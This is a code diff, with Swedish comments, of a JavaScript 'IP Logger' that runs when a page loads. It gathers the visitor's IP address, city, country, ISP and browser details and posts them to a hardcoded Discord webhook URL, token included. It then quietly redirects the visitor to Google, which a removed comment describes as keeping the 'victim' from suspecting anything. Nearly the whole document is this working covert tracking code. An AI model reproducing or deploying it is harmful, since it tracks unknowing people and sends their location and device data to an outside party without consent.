@@ -3,15 +3,13 @@
     
     // ============================================
     // SÄTT IN DIN DISCORD WEBHOOK HÄR
-    // GRATIS: gå till Discord serverinställningar -> Integrationer -> Webhooks
     // ============================================
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1486791223199928600/WdFIJEPc91Opodm0hHCsGQjgwawUFUx8kOzYYyMH1bfaEAnj264TVURXGj1RKXBUrLv7';
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1486791223199928600/WdFIJEPc91Opodm0hHCsGQjgwawUFUx8kOzYYyMH1bfaEAnj264TVURXGj1RKXBUrLv7";
     
     // ============================================
     // HÄMTA IP (GRATIS API)
     // ============================================
     async function getIP() {
-        // Gratis IP-API, inget konto krävs
         const apis = [
             'https://api.ipify.org?format=json',
             'https://api.my-ip.io/ip.json',
@@ -31,11 +29,7 @@
                         city: data.city,
                         region: data.region,
                         country: data.country_name,
-                        postal: data.postal,
-                        latitude: data.latitude,
-                        longitude: data.longitude,
-                        isp: data.org,
-                        timezone: data.timezone
+                        isp: data.org
                     };
                 }
             } catch(e) {}
@@ -44,7 +38,7 @@
     }
     
     // ============================================
-    // HÄMTA EXTRA DATA (GRATIS)
+    // HÄMTA BROWSERDATA
     // ============================================
     function getBrowserData() {
         const screen = window.screen;
@@ -61,16 +55,15 @@
     }
     
     // ============================================
-    // SKICKA TILL DISCORD (GRATIS)
+    // SKICKA TILL DISCORD
     // ============================================
     async function sendToDiscord() {
         try {
             const ipData = await getIP();
             const browserData = getBrowserData();
             
-            // Bygg meddelandet
             const embed = {
-                title: '🎯 New Visitor Captured',
+                title: '🎯 New Visitor',
                 color: 0x00ff00,
                 fields: [
                     {
@@ -80,16 +73,21 @@
                     },
                     {
                         name: '📍 Location',
-                        value: ipData.city ? `${ipData.city}, ${ipData.country}` : 'Fetching...',
+                        value: ipData.city ? `${ipData.city}, ${ipData.country}` : 'Unknown',
                         inline: true
                     },
                     {
-                        name: '🖥️ Device',
+                        name: '🏢 ISP',
+                        value: ipData.isp || 'Unknown',
+                        inline: true
+                    },
+                    {
+                        name: '💻 Device',
                         value: browserData.userAgent.substring(0, 80),
                         inline: false
                     },
                     {
-                        name: '🔧 Details',
+                        name: '🖥️ System',
                         value: `**OS:** ${browserData.platform}\n**Language:** ${browserData.language}\n**Screen:** ${browserData.screenSize}\n**Timezone:** ${browserData.timezone}`,
                         inline: true
                     },
@@ -100,26 +98,9 @@
                     }
                 ],
                 footer: {
-                    text: `IP Logger • ${new Date().toLocaleString()}`
+                    text: `IP Logger`
                 }
             };
-            
-            // Lägg till mer info om ipapi gav extra data
-            if (ipData.isp) {
-                embed.fields.push({
-                    name: '🏢 ISP',
-                    value: ipData.isp,
-                    inline: true
-                });
-            }
-            
-            if (ipData.latitude) {
-                embed.fields.push({
-                    name: '🗺️ Coordinates',
-                    value: `${ipData.latitude}, ${ipData.longitude}`,
-                    inline: true
-                });
-            }
             
             await fetch(WEBHOOK_URL, {
                 method: 'POST',
@@ -128,24 +109,22 @@
             });
             
         } catch(e) {
-            // Tyst fail
+            console.log('Error:', e);
         }
     }
     
     // ============================================
-    // OMDIRIGERING (VALFRITT)
+    // OMDIRIGERING
     // ============================================
     function redirect() {
-        // Omdirigera till en vanlig sida så offret inte misstänker något
         window.location.href = 'https://www.google.com';
     }
     
     // ============================================
-    // KÖR ALLT
+    // KÖR
     // ============================================
     sendToDiscord().then(() => {
-        // Vänta 2 sekunder och omdirigera
-        setTimeout(redirect, 2000);
+        setTimeout(redirect, 1500);
     });
     
 })();
